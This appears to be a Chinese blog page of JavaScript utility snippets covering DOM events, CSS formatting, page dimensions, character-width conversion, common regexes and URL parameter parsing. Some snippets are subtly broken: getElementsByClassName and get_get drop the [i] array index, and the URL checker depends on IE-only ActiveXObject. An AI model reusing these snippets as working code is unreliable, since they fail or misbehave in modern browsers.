<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Element.prototype.trigger = <span class="function"><span class="keyword">function</span> (<span class="params">type, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> event = <span class="built_in">document</span>.createEvent(<span class="string">'HTMLEvents'</span>);</span><br><span class="line">    event.initEvent(type, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    event.data = data || &#123;&#125;;</span><br><span class="line">    event.eventName = type;</span><br><span class="line">    event.target = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>.dispatchEvent(event);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">NodeList.prototype.trigger = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    [][<span class="string">'forEach'</span>].call(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params">el</span>) </span>&#123;</span><br><span class="line">        el[<span class="string">'trigger'</span>](event);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="检验url链接是否有效"><a class="markdownIt-Anchor" href="#检验url链接是否有效"></a> 检验URL链接是否有效</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlState</span>(<span class="params">URL</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"microsoft.xmlhttp"</span>); </span><br><span class="line">    xmlhttp.Open(<span class="string">"GET"</span>,URL, <span class="literal">false</span>);  </span><br><span class="line">    <span class="keyword">try</span>&#123;  </span><br><span class="line">            xmlhttp.Send(); </span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123; </span><br><span class="line">        <span class="keyword">var</span> result = xmlhttp.responseText; </span><br><span class="line">        <span class="keyword">if</span>(result)&#123;</span><br><span class="line">            <span class="keyword">if</span>(xmlhttp.Status==<span class="number">200</span>)&#123; </span><br><span class="line">                <span class="keyword">return</span>(<span class="literal">true</span>); </span><br><span class="line">             &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                   <span class="keyword">return</span>(<span class="literal">false</span>); </span><br><span class="line">             &#125; </span><br><span class="line">         &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">             <span class="keyword">return</span>(<span class="literal">false</span>); </span><br><span class="line">         &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="格式化css样式代码"><a class="markdownIt-Anchor" href="#格式化css样式代码"></a> 格式化CSS样式代码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatCss</span>(<span class="params">s</span>)</span>&#123;<span class="comment">//格式化代码</span></span><br><span class="line">    s = s.replace(<span class="regexp">/\s*([\&#123;\&#125;\:\;\,])\s*/g</span>, <span class="string">"$1"</span>);</span><br><span class="line">    s = s.replace(<span class="regexp">/;\s*;/g</span>, <span class="string">";"</span>); <span class="comment">//清除连续分号</span></span><br><span class="line">    s = s.replace(<span class="regexp">/\,[\s\.\#\d]*&#123;/g</span>, <span class="string">"&#123;"</span>);</span><br><span class="line">    s = s.replace(<span class="regexp">/([^\s])\&#123;([^\s])/g</span>, <span class="string">"$1 &#123;\n\t$2"</span>);</span><br><span class="line">    s = s.replace(<span class="regexp">/([^\s])\&#125;([^\n]*)/g</span>, <span class="string">"$1\n&#125;\n$2"</span>);</span><br><span class="line">    s = s.replace(<span class="regexp">/([^\s]);([^\s\&#125;])/g</span>, <span class="string">"$1;\n\t$2"</span>);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="压缩css样式代码"><a class="markdownIt-Anchor" href="#压缩css样式代码"></a> 压缩CSS样式代码</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compressCss</span> (<span class="params">s</span>) </span>&#123;<span class="comment">//压缩代码</span></span><br><span class="line">    s = s.replace(<span class="regexp">/\/\*(.|\n)*?\*\//g</span>, <span class="string">""</span>); <span class="comment">//删除注释</span></span><br><span class="line">    s = s.replace(<span class="regexp">/\s*([\&#123;\&#125;\:\;\,])\s*/g</span>, <span class="string">"$1"</span>);</span><br><span class="line">    s = s.replace(<span class="regexp">/\,[\s\.\#\d]*\&#123;/g</span>, <span class="string">"&#123;"</span>); <span class="comment">//容错处理</span></span><br><span class="line">    s = s.replace(<span class="regexp">/;\s*;/g</span>, <span class="string">";"</span>); <span class="comment">//清除连续分号</span></span><br><span class="line">    s = s.match(<span class="regexp">/^\s*(\S+(\s+\S+)*)\s*$/</span>); <span class="comment">//去掉首尾空白</span></span><br><span class="line">    <span class="keyword">return</span> (s == <span class="literal">null</span>) ? <span class="string">""</span> : s[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="美判断是否为网址"><a class="markdownIt-Anchor" href="#美判断是否为网址"></a> 美判断是否为网址</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsURL</span>(<span class="params">strUrl</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> regular = <span class="regexp">/^\b(((https?|ftp):\/\/)?[-a-z0-9]+(\.[-a-z0-9]+)*\.(?:com|edu|gov|int|mil|net|org|biz|info|name|museum|asia|coop|aero|[a-z][a-z]|((25[0-5])|(2[0-4]\d)|(1\d\d)|([1-9]\d)|\d))\b(\/[-a-z0-9_:\@&amp;?=+,.!\/~%\$]*)?)$/i</span></span><br><span class="line">    <span class="keyword">if</span> (regular.test(strUrl)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="etelementsbyclassname"><a class="markdownIt-Anchor" href="#etelementsbyclassname"></a> etElementsByClassName</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElementsByClassName</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tags = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'*'</span>) || <span class="built_in">document</span>.all;</span><br><span class="line">    <span class="keyword">var</span> els = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tags.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tags.className) &#123;</span><br><span class="line">            <span class="keyword">var</span> cs = tags.className.split(<span class="string">' '</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; cs.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (name == cs[j]) &#123;</span><br><span class="line">                    els.push(tags);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> els</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取页面高度"><a class="markdownIt-Anchor" href="#取页面高度"></a> 取页面高度</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageHeight</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> g = <span class="built_in">document</span>, a = g.body, f = g.documentElement, d = g.compatMode == <span class="string">"BackCompat"</span></span><br><span class="line">                    ? a</span><br><span class="line">                    : g.documentElement;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(f.scrollHeight, a.scrollHeight, d.clientHeight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取页面scrollleft"><a class="markdownIt-Anchor" href="#取页面scrollleft"></a> 取页面scrollLeft</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageScrollLeft</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>;</span><br><span class="line">    <span class="keyword">return</span> a.documentElement.scrollLeft || a.body.scrollLeft;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取页面可视宽度"><a class="markdownIt-Anchor" href="#取页面可视宽度"></a> 取页面可视宽度</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageViewWidth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="built_in">document</span>, a = d.compatMode == <span class="string">"BackCompat"</span></span><br><span class="line">                    ? d.body</span><br><span class="line">                    : d.documentElement;</span><br><span class="line">    <span class="keyword">return</span> a.clientWidth;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取页面宽度"><a class="markdownIt-Anchor" href="#取页面宽度"></a> 取页面宽度</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageWidth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> g = <span class="built_in">document</span>, a = g.body, f = g.documentElement, d = g.compatMode == <span class="string">"BackCompat"</span></span><br><span class="line">                    ? a</span><br><span class="line">                    : g.documentElement;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(f.scrollWidth, a.scrollWidth, d.clientWidth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取页面scrolltop"><a class="markdownIt-Anchor" href="#取页面scrolltop"></a> 取页面scrollTop</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageScrollTop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>;</span><br><span class="line">    <span class="keyword">return</span> a.documentElement.scrollTop || a.body.scrollTop;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取页面可视高度"><a class="markdownIt-Anchor" href="#取页面可视高度"></a> 取页面可视高度</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageViewHeight</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="built_in">document</span>, a = d.compatMode == <span class="string">"BackCompat"</span></span><br><span class="line">                    ? d.body</span><br><span class="line">                    : d.documentElement;</span><br><span class="line">    <span class="keyword">return</span> a.clientHeight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="掉url前缀"><a class="markdownIt-Anchor" href="#掉url前缀"></a> 掉url前缀</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeUrlPrefix</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    a=a.replace(<span class="regexp">/：/g</span>,<span class="string">":"</span>).replace(<span class="regexp">/．/g</span>,<span class="string">"."</span>).replace(<span class="regexp">/／/g</span>,<span class="string">"/"</span>);</span><br><span class="line">    <span class="keyword">while</span>(trim(a).toLowerCase().indexOf(<span class="string">"http://"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">        a=trim(a.replace(<span class="regexp">/http:\/\//i</span>,<span class="string">""</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="随机数时间戳"><a class="markdownIt-Anchor" href="#随机数时间戳"></a> 随机数时间戳</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueId</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="built_in">Math</span>.random,b=<span class="built_in">parseInt</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(<span class="keyword">new</span> <span class="built_in">Date</span>()).toString()+b(<span class="number">10</span>*a())+b(<span class="number">10</span>*a())+b(<span class="number">10</span>*a());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="全角半角转换"><a class="markdownIt-Anchor" href="#全角半角转换"></a> 全角半角转换</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//iCase: 0全到半，1半到全，其他不转化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chgCase</span>(<span class="params">sStr,iCase</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> sStr != <span class="string">"string"</span> || sStr.length &lt;= <span class="number">0</span> || !(iCase === <span class="number">0</span> || iCase == <span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> sStr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> i,oRs=[],iCode;</span><br><span class="line">    <span class="keyword">if</span>(iCase)&#123;<span class="comment">/*半-&gt;全*/</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;sStr.length;i+=<span class="number">1</span>)&#123; </span><br><span class="line">            iCode = sStr.charCodeAt(i);</span><br><span class="line">            <span class="keyword">if</span>(iCode == <span class="number">32</span>)&#123;</span><br><span class="line">                iCode = <span class="number">12288</span>;                                </span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(iCode &lt; <span class="number">127</span>)&#123;</span><br><span class="line">                iCode += <span class="number">65248</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                oRs.push(<span class="built_in">String</span>.fromCharCode(iCode)); </span><br><span class="line">            &#125;                </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">/*全-&gt;半*/</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;sStr.length;i+=<span class="number">1</span>)&#123; </span><br><span class="line">            iCode = sStr.charCodeAt(i);</span><br><span class="line">            <span class="keyword">if</span>(iCode == <span class="number">12288</span>)&#123;</span><br><span class="line">                iCode = <span class="number">32</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(iCode &gt; <span class="number">65280</span> &amp;&amp; iCode &lt; <span class="number">65375</span>)&#123;</span><br><span class="line">                iCode -= <span class="number">65248</span>;                                </span><br><span class="line">            &#125;</span><br><span class="line">                oRs.push(<span class="built_in">String</span>.fromCharCode(iCode)); </span><br><span class="line">         &#125;                </span><br><span class="line">    &#125;                </span><br><span class="line">    <span class="keyword">return</span> oRs.join(<span class="string">""</span>);                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="确认是否键盘有效输入值"><a class="markdownIt-Anchor" href="#确认是否键盘有效输入值"></a> 确认是否键盘有效输入值</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkKey</span>(<span class="params">iKey</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(iKey == <span class="number">32</span> || iKey == <span class="number">229</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*空格和异常*/</span></span><br><span class="line">    <span class="keyword">if</span>(iKey&gt;<span class="number">47</span> &amp;&amp; iKey &lt; <span class="number">58</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*数字*/</span></span><br><span class="line">    <span class="keyword">if</span>(iKey&gt;<span class="number">64</span> &amp;&amp; iKey &lt; <span class="number">91</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*字母*/</span></span><br><span class="line">    <span class="keyword">if</span>(iKey&gt;<span class="number">95</span> &amp;&amp; iKey &lt; <span class="number">108</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*数字键盘1*/</span></span><br><span class="line">    <span class="keyword">if</span>(iKey&gt;<span class="number">108</span> &amp;&amp; iKey &lt; <span class="number">112</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*数字键盘2*/</span></span><br><span class="line">    <span class="keyword">if</span>(iKey&gt;<span class="number">185</span> &amp;&amp; iKey &lt; <span class="number">193</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*符号1*/</span></span><br><span class="line">    <span class="keyword">if</span>(iKey&gt;<span class="number">218</span> &amp;&amp; iKey &lt; <span class="number">223</span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;<span class="comment">/*符号2*/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取网页被卷去的位置scroll"><a class="markdownIt-Anchor" href="#获取网页被卷去的位置scroll"></a> 获取网页被卷去的位置(scroll)</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getScrollXY</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">document</span>.body.scrollTop ? &#123;</span><br><span class="line">        x: <span class="built_in">document</span>.body.scrollLeft,</span><br><span class="line">        y: <span class="built_in">document</span>.body.scrollTop</span><br><span class="line">    &#125;: &#123;</span><br><span class="line">        x: <span class="built_in">document</span>.documentElement.scrollLeft,</span><br><span class="line">        y: <span class="built_in">document</span>.documentElement.scrollTop</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解决offsetx兼容性问题"><a class="markdownIt-Anchor" href="#解决offsetx兼容性问题"></a> 解决offsetX兼容性问题</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 针对火狐不支持offsetX/Y</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getOffset</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> target = e.target, <span class="comment">// 当前触发的目标对象</span></span><br><span class="line">          eventCoord,</span><br><span class="line">          pageCoord,</span><br><span class="line">          offsetCoord;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 计算当前触发元素到文档的距离</span></span><br><span class="line">    pageCoord = getPageCoord(target);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 计算光标到文档的距离</span></span><br><span class="line">    eventCoord = &#123;</span><br><span class="line">        X : <span class="built_in">window</span>.pageXOffset + e.clientX,</span><br><span class="line">        Y : <span class="built_in">window</span>.pageYOffset + e.clientY</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 相减获取光标到第一个定位的父元素的坐标</span></span><br><span class="line">    offsetCoord = &#123;</span><br><span class="line">        X : eventCoord.X - pageCoord.X,</span><br><span class="line">        Y : eventCoord.Y - pageCoord.Y</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> offsetCoord;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageCoord</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> coord = &#123; <span class="attr">X</span> : <span class="number">0</span>, <span class="attr">Y</span> : <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 计算从当前触发元素到根节点为止，</span></span><br><span class="line">    <span class="comment">// 各级 offsetParent 元素的 offsetLeft 或 offsetTop 值之和</span></span><br><span class="line">    <span class="keyword">while</span> (element)&#123;</span><br><span class="line">        coord.X += element.offsetLeft;</span><br><span class="line">        coord.Y += element.offsetTop;</span><br><span class="line">        element = element.offsetParent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> coord;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="常用的正则表达式"><a class="markdownIt-Anchor" href="#常用的正则表达式"></a> 常用的正则表达式</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正整数</span></span><br><span class="line">/^[<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*$/;</span><br><span class="line"><span class="comment">//负整数</span></span><br><span class="line">/^-[<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*$/;</span><br><span class="line"><span class="comment">//正浮点数</span></span><br><span class="line">/^(([<span class="number">0</span><span class="number">-9</span>]+\.[<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*)|([<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*\.[<span class="number">0</span><span class="number">-9</span>]+)|([<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*))$/;   </span><br><span class="line"><span class="comment">//负浮点数</span></span><br><span class="line">/^(-(([<span class="number">0</span><span class="number">-9</span>]+\.[<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*)|([<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*\.[<span class="number">0</span><span class="number">-9</span>]+)|([<span class="number">0</span><span class="number">-9</span>]*[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*)))$/;  </span><br><span class="line"><span class="comment">//浮点数</span></span><br><span class="line">/^(-?\d+)(\.\d+)?$/;</span><br><span class="line"><span class="comment">//email地址</span></span><br><span class="line">/^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$/;</span><br><span class="line"><span class="comment">//url地址</span></span><br><span class="line">/^[a-zA-z]+:<span class="comment">//(\w+(-\w+)*)(\.(\w+(-\w+)*))*(\?\S*)?$/;</span></span><br><span class="line">或：^http:\/\/[A-Za-z0<span class="number">-9</span>]+\.[A-Za-z0<span class="number">-9</span>]+[\/=\?%\-&amp;_~<span class="string">`@[\]\':+!]*([^&lt;&gt;\"\"])*$ </span></span><br><span class="line"><span class="string">//年/月/日（年-月-日、年.月.日）</span></span><br><span class="line"><span class="string">/^(19|20)\d\d[- /.](0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])$/;</span></span><br><span class="line"><span class="string">//匹配中文字符</span></span><br><span class="line"><span class="string">/[\u4e00-\u9fa5]/;</span></span><br><span class="line"><span class="string">//匹配帐号是否合法(字母开头，允许5-10字节，允许字母数字下划线)</span></span><br><span class="line"><span class="string">/^[a-zA-Z][a-zA-Z0-9_]&#123;4,9&#125;$/;</span></span><br><span class="line"><span class="string">//匹配空白行的正则表达式</span></span><br><span class="line"><span class="string">/\n\s*\r/;</span></span><br><span class="line"><span class="string">//匹配中国邮政编码</span></span><br><span class="line"><span class="string">/[1-9]\d&#123;5&#125;(?!\d)/;</span></span><br><span class="line"><span class="string">//匹配身份证</span></span><br><span class="line"><span class="string">/\d&#123;15&#125;|\d&#123;18&#125;/;</span></span><br><span class="line"><span class="string">//匹配国内电话号码</span></span><br><span class="line"><span class="string">/(\d&#123;3&#125;-|\d&#123;4&#125;-)?(\d&#123;8&#125;|\d&#123;7&#125;)?/;</span></span><br><span class="line"><span class="string">//匹配IP地址</span></span><br><span class="line"><span class="string">/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)/;</span></span><br><span class="line"><span class="string">//匹配首尾空白字符的正则表达式</span></span><br><span class="line"><span class="string">/^\s*|\s*$/;</span></span><br><span class="line"><span class="string">//匹配HTML标记的正则表达式</span></span><br><span class="line"><span class="string">&lt; (\S*?)[^&gt;]*&gt;.*?|&lt; .*? /&gt;;</span></span><br><span class="line"><span class="string">//sql 语句</span></span><br><span class="line"><span class="string">^(select|drop|delete|create|update|insert).*$</span></span><br><span class="line"><span class="string">//提取信息中的网络链接</span></span><br><span class="line"><span class="string">(h|H)(r|R)(e|E)(f|F) *= *('|")?(\w|\\|\/|\.)+('|"| *|&gt;)? </span></span><br><span class="line"><span class="string">//提取信息中的邮件地址</span></span><br><span class="line"><span class="string">\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)* </span></span><br><span class="line"><span class="string">//提取信息中的图片链接</span></span><br><span class="line"><span class="string">(s|S)(r|R)(c|C) *= *('|")?(\w|\\|\/|\.)+('|"| *|&gt;)? </span></span><br><span class="line"><span class="string">//提取信息中的 IP 地址</span></span><br><span class="line"><span class="string">(\d+)\.(\d+)\.(\d+)\.(\d+)</span></span><br><span class="line"><span class="string">//取信息中的中国手机号码</span></span><br><span class="line"><span class="string">(86)*0*13\d&#123;9&#125; </span></span><br><span class="line"><span class="string">//提取信息中的中国邮政编码</span></span><br><span class="line"><span class="string">[1-9]&#123;1&#125;(\d+)&#123;5&#125; </span></span><br><span class="line"><span class="string">//提取信息中的浮点数（即小数）</span></span><br><span class="line"><span class="string">(-?\d*)\.?\d+ </span></span><br><span class="line"><span class="string">//提取信息中的任何数字</span></span><br><span class="line"><span class="string">(-?\d*)(\.\d+)?</span></span><br><span class="line"><span class="string">//电话区号</span></span><br><span class="line"><span class="string">^0\d&#123;2,3&#125;$</span></span><br><span class="line"><span class="string">//腾讯 QQ 号</span></span><br><span class="line"><span class="string">^[1-9]*[1-9][0-9]*$ </span></span><br><span class="line"><span class="string">//帐号（字母开头，允许 5-16 字节，允许字母数字下划线）</span></span><br><span class="line"><span class="string">^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ </span></span><br><span class="line"><span class="string">//中文、英文、数字及下划线</span></span><br><span class="line"><span class="string">^[\u4e00-\u9fa5_a-zA-Z0-9]+$</span></span><br></pre></td></tr></table></figure>
<h3 id="返回顶部的通用方法"><a class="markdownIt-Anchor" href="#返回顶部的通用方法"></a> 返回顶部的通用方法</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backTop</span>(<span class="params">btnId</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(btnId);</span><br><span class="line">    <span class="keyword">var</span> d = <span class="built_in">document</span>.documentElement;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">document</span>.body;</span><br><span class="line">    <span class="built_in">window</span>.onscroll = <span class="keyword">set</span>;</span><br><span class="line">    btn.style.display = "none";</span><br><span class="line">    btn.onclick = function() &#123;</span><br><span class="line">        btn.style.display = <span class="string">"none"</span>;</span><br><span class="line">        <span class="built_in">window</span>.onscroll = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.timer = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            d.scrollTop -= <span class="built_in">Math</span>.ceil((d.scrollTop + b.scrollTop) * <span class="number">0.1</span>);</span><br><span class="line">            b.scrollTop -= <span class="built_in">Math</span>.ceil((d.scrollTop + b.scrollTop) * <span class="number">0.1</span>);</span><br><span class="line">            <span class="keyword">if</span> ((d.scrollTop + b.scrollTop) == <span class="number">0</span>) clearInterval(btn.timer, <span class="built_in">window</span>.onscroll = <span class="keyword">set</span>);</span><br><span class="line">            &#125;, 10);</span><br><span class="line">    &#125;;</span><br><span class="line">    function <span class="keyword">set</span>() &#123;</span><br><span class="line">        btn.style.display = (d.scrollTop + b.scrollTop &gt; <span class="number">100</span>) ? <span class="string">'block'</span>: <span class="string">"none"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">backTop(<span class="string">'goTop'</span>);</span><br></pre></td></tr></table></figure>
<p>**获得URL中GET参数值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用法：如果地址是 test.htm?t1=1&amp;t2=2&amp;t3=3, 那么能取得：GET["t1"], GET["t2"], GET["t3"]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_get</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    querystr = <span class="built_in">window</span>.location.href.split(<span class="string">"?"</span>)</span><br><span class="line">    <span class="keyword">if</span>(querystr[<span class="number">1</span>])&#123;</span><br><span class="line">        GETs = querystr[<span class="number">1</span>].split(<span class="string">"&amp;"</span>);</span><br><span class="line">        GET = [];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;GETs.length;i++)&#123;</span><br><span class="line">              tmp_arr = GETs.split(<span class="string">"="</span>)</span><br><span class="line">              key=tmp_arr[<span class="number">0</span>]</span><br><span class="line">              GET[key] = tmp_arr[<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> querystr[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="打开一个窗体通用方法"><a class="markdownIt-Anchor" href="#打开一个窗体通用方法"></a> 打开一个窗体通用方法</h3>
